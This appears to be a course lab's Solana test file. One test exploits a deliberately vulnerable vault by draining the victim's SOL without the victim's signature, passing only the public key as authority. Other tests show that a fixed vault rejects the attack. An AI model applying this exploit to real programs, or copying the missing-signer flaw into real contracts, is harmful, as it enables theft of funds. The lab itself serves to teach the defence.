import * as anchor from "@coral-xyz/anchor";
import { Program, BN } from "@coral-xyz/anchor";
import {
  Keypair,
  LAMPORTS_PER_SOL,
  PublicKey,
  SystemProgram,
  Transaction,
} from "@solana/web3.js";
import { assert } from "chai";
import { VulnVault } from "../target/types/vuln_vault";
import { SecureVault } from "../target/types/secure_vault";

// Week 12: exploit the vulnerable vault, then show the fixed version resists the same attack.
describe("security lab (week 12)", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const vuln = anchor.workspace.vulnVault as Program<VulnVault>;
  const secure = anchor.workspace.secureVault as Program<SecureVault>;
  const conn = provider.connection;
  const payer = provider.wallet.publicKey;

  const victim = Keypair.generate();
  const attacker = Keypair.generate();
  const DEPOSIT = 0.1 * LAMPORTS_PER_SOL;
  const STEAL = 0.05 * LAMPORTS_PER_SOL;

  const vaultOf = (programId: PublicKey) =>
    PublicKey.findProgramAddressSync(
      [Buffer.from("vault"), victim.publicKey.toBuffer()],
      programId
    )[0];

  before("fund the victim (pays rent for two vaults)", async () => {
    await provider.sendAndConfirm(
      new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: payer,
          toPubkey: victim.publicKey,
          lamports: 0.05 * LAMPORTS_PER_SOL,
        })
      )
    );
  });

  it("EXPLOIT: attacker drains the victim's vault WITHOUT the victim's signature", async () => {
    const vault = vaultOf(vuln.programId);

    await vuln.methods
      .initialize()
      .accountsPartial({ vault, authority: victim.publicKey })
      .signers([victim])
      .rpc();
    await vuln.methods
      .deposit(new BN(DEPOSIT))
      .accountsPartial({ vault, depositor: payer })
      .rpc();

    const before = await conn.getBalance(attacker.publicKey);

    // The victim never signs. We just put the victim's PUBLIC key in the
    // `authority` slot, which is enough to pass the key comparison.
    await vuln.methods
      .withdraw(new BN(STEAL))
      .accountsPartial({
        vault,
        authority: victim.publicKey,
        recipient: attacker.publicKey,
      })
      .rpc();

    const after = await conn.getBalance(attacker.publicKey);
    assert.equal(after - before, STEAL, "attacker received the victim's SOL");
  });

  it("FIX: the same attack is rejected by the secure vault", async () => {
    const vault = vaultOf(secure.programId);

    await secure.methods
      .initialize()
      .accountsPartial({ vault, authority: victim.publicKey })
      .signers([victim])
      .rpc();
    await secure.methods
      .deposit(new BN(DEPOSIT))
      .accountsPartial({ vault, depositor: payer })
      .rpc();

    let rejected = false;
    try {
      // Victim does not sign -> must fail
      await secure.methods
        .withdraw(new BN(STEAL))
        .accountsPartial({ vault, authority: victim.publicKey })
        .rpc();
    } catch {
      rejected = true;
    }
    assert.isTrue(rejected, "withdraw without the authority's signature must fail");
  });

  it("FIX: the real authority can still withdraw", async () => {
    const vault = vaultOf(secure.programId);
    const before = await conn.getBalance(victim.publicKey);

    await secure.methods
      .withdraw(new BN(STEAL))
      .accountsPartial({ vault, authority: victim.publicKey })
      .signers([victim])
      .rpc();

    const after = await conn.getBalance(victim.publicKey);
    assert.equal(after - before, STEAL);
  });
});
